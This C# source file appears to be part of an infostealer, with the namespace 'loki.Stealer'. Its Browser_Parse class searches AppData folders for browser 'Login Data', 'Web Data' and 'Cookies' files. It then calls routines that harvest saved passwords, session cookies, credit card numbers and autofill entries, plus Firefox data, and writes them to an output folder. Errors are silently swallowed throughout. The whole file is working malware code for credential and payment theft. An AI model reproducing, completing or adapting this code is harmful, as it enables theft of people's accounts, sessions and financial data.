using System;
using System.Collections.Generic;
using System.IO;
using loki.loki.Stealer;
using loki.loki.Stealer.Cookies;
using loki.loki.Stealer.Credit_Cards;
using loki.loki.Stealer.Passwords;
using loki.loki.Stealer.WebData;

namespace loki.loki;

internal class Browser_Parse
{
	public static readonly string LocalAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local");

	public static readonly string RoamingAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Roaming");

	public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
	{
		List<string> list = new List<string>();
		if (files != null && files.Length != 0 && level <= maxLevel)
		{
			try
			{
				string[] directories = Directory.GetDirectories(baseDirectory);
				string[] array = directories;
				foreach (string path in array)
				{
					try
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(path);
						FileInfo[] files2 = directoryInfo.GetFiles();
						bool flag = false;
						for (int j = 0; j < files2.Length; j++)
						{
							if (flag)
							{
								break;
							}
							for (int k = 0; k < files.Length; k++)
							{
								if (flag)
								{
									break;
								}
								string text = files[k];
								FileInfo fileInfo = files2[j];
								if (text == fileInfo.Name)
								{
									flag = true;
									list.Add(fileInfo.FullName);
								}
							}
						}
						foreach (string item in FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
						{
							if (!list.Contains(item))
							{
								list.Add(item);
							}
						}
						directoryInfo = null;
					}
					catch
					{
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}
		return list;
	}

	private static List<string> GetProfile()
	{
		List<string> list = new List<string>();
		try
		{
			list.AddRange(FindPaths(RoamingAppData, 4, 1, "Login Data", "Web Data", "Cookies"));
			list.AddRange(FindPaths(LocalAppData, 4, 1, "Login Data", "Web Data", "Cookies"));
			return list;
		}
		catch
		{
			return list;
		}
	}

	private static string GetRoadData(string path)
	{
		try
		{
			return path.Split(new string[1] { "AppData\\Roaming\\" }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries)[0];
		}
		catch
		{
		}
		return string.Empty;
	}

	private static string GetLclName(string path)
	{
		try
		{
			string[] array = path.Split(new string[1] { "AppData\\Local\\" }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
			return array[0] + "_" + array[1];
		}
		catch
		{
		}
		return string.Empty;
	}

	private static string GetName(string path)
	{
		try
		{
			string[] array = path.Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
			if (array[^2] == "User Data")
			{
				return array[^1];
			}
		}
		catch
		{
		}
		return "Unknown";
	}

	public static void parse(string dir)
	{
		Directory.CreateDirectory(dir + "\\Browsers");
		try
		{
			mozila.mozila_still();
		}
		catch
		{
		}
		try
		{
			new object();
			List<string> profile = GetProfile();
			foreach (string item in profile)
			{
				try
				{
					string fullName = new FileInfo(item).Directory!.FullName;
					string text = (item.Contains(RoamingAppData) ? GetRoadData(fullName) : GetLclName(fullName));
					if (!string.IsNullOrEmpty(text))
					{
						text = text[0].ToString().ToUpper() + text.Remove(0, 1);
						string name = GetName(fullName);
						GetCookies.Cookie_Grab(fullName, text, name);
						GetPasswords.Passwords_Grab(fullName, text, name);
						GetPasswords.Write_Passwords();
						Get_Credit_Cards.Get_CC(fullName, text, name);
						Get_Credit_Cards.Write_CC(text, name);
						Get_Browser_Autofill.get_Autofill(fullName, text, name);
						Get_Browser_Autofill.Write_Autofill(text, name);
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}
}
